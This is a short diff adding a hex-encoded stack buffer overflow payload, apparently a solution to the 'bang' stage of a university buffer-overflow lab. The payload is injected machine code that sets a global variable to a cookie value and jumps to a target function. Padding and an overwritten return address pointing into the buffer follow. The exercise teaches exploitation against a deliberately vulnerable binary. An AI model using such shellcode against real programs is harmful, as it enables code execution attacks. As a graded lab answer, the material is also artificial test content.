@@ -1,0 +1,10 @@
+ba 68 d2 04 08       	/* mov    $0x804d268,%edx (0x804d268 is the address of global_value.) */
+b8 bc 0f a6 76       	/* mov    $0x76a60fbc,%eax	(0x76a60fbc is my cookie.)  */
+89 02                	/* mov    %eax,(%edx) */
+68 d9 8b 04 08       	/* push   $0x8048bd9 (0x8048bd9 is address of bang.) */
+c3                   	/* ret    */
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32
+68 36 68 55 /* 0x55683668 is address of buf. */
